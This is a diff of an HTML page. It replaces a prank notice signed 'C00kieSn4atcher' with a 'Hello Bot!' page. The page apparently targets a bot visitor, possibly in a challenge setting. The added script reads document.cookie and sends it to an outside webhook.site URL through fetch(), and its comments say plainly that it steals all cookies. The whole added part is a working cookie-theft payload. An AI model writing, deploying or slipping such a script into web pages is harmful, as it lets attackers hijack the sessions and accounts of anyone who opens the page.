@@ -1,51 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8"/>
-  <title>Notice</title>
-  <style>
-    body {
-      background-color: #f2f2f2;
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 60px;
-    }
-    .container {
-      background: white;
-      display: inline-block;
-      padding: 30px 40px;
-      border-radius: 8px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.15);
-      max-width: 450px;
-    }
-    img {
-      max-width: 100%;
-      height: 200px;
-      width: 350px;
-      border-radius: 4px;
-      margin-bottom: 20px;
-    }
-    .picCont{
-      display: flex;
-      gap: 5px;
-      
-    }
-    .tease {
-      font-size: 1.2em;
-      color: #d9534f;
-      line-height: 1.4;
-    }
-  </style>
+    <title>Page</title>
 </head>
 <body>
-  <div class="container">
-    <!-- Image located at static/images/alrashdi.png -->
-     <div class="picCont">
-      <img src="alrashdi.jpg" alt="alrashdi">
-      <img src="monti.jpg" alt="alrashdi">
-    </div>
-    <div class="tease">حشى صدقت عاد مرة ثانية لا تضغط على اي رابط</div>
-    <div class="tease">Got played by C00kieSn4atcher</div>
-  </div>
+    <h1>Hello Bot!</h1>
+    
+    <script>
+        // Replace YOUR-WEBHOOK-ID with your actual webhook ID from webhook.site
+        const WEBHOOK_URL = 'https://webhook.site/6d3e8cd9-6f88-4f09-868d-26d8e5b4057b';
+        
+        // Simply steal all cookies and send to webhook
+        fetch(WEBHOOK_URL + '?cookies=' + encodeURIComponent(document.cookie))
+            .then(() => console.log('Cookies sent!'))
+            .catch(e => console.log('Error:', e));
+    </script>
 </body>
 </html>
